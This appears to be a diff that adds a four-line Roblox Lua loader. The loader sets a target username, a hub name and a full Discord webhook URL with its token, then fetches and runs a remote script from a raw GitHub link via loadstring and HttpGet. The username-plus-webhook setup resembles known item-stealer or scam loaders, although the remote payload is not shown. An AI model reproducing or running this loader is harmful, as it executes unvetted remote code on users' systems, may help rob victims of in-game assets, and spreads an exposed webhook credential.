@@ -1,0 +1,4 @@
+_G.Username = "villain_juni"
+_G.HubName = "visure script"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1102877980109328486/qd1h4aQ6f3M8s2VajMRMYJAxKJy8thw6bKt7Pzffe_w47luwEjQL9viRJ9McQ5l3JEnm"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()```
